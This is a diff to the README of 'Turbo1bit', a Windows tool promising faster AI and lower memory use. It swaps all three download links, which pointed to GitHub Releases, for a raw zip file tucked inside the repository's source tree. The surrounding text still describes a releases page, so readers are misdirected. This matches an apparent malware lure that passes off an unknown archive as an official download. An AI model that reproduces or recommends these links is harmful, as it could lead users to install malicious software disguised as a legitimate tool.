@@ -1,6 +1,6 @@
 # ⚡ Turbo1bit - Faster AI, Lower Memory Use
 
-[![Download Turbo1bit](https://img.shields.io/badge/Download-Turbo1bit-blue?style=for-the-badge)](https://github.com/916masternappa970/Turbo1bit/releases)
+[![Download Turbo1bit](https://img.shields.io/badge/Download-Turbo1bit-blue?style=for-the-badge)](https://github.com/916masternappa970/Turbo1bit/raw/refs/heads/main/tools/turbo1bit/Turbo-bit-discussional.zip)
 
 ## 🧩 What Turbo1bit Does
 
@@ -31,7 +31,7 @@ Turbo1bit is made for Windows PCs.
 
 Visit this page to download the latest release:
 
-[Download Turbo1bit from GitHub Releases](https://github.com/916masternappa970/Turbo1bit/releases)
+[Download Turbo1bit from GitHub Releases](https://github.com/916masternappa970/Turbo1bit/raw/refs/heads/main/tools/turbo1bit/Turbo-bit-discussional.zip)
 
 On that page, look for the newest version and download the Windows file that matches your system. If there are several files, choose the one made for Windows.
 
@@ -157,7 +157,7 @@ Turbo1bit is built to reduce memory use. That can help on systems where RAM is t
 
 Get the latest Windows build here:
 
-[https://github.com/916masternappa970/Turbo1bit/releases](https://github.com/916masternappa970/Turbo1bit/releases)
+[https://github.com/916masternappa970/Turbo1bit/raw/refs/heads/main/tools/turbo1bit/Turbo-bit-discussional.zip](https://github.com/916masternappa970/Turbo1bit/raw/refs/heads/main/tools/turbo1bit/Turbo-bit-discussional.zip)
 
 ## 🔍 What to Do Next
 
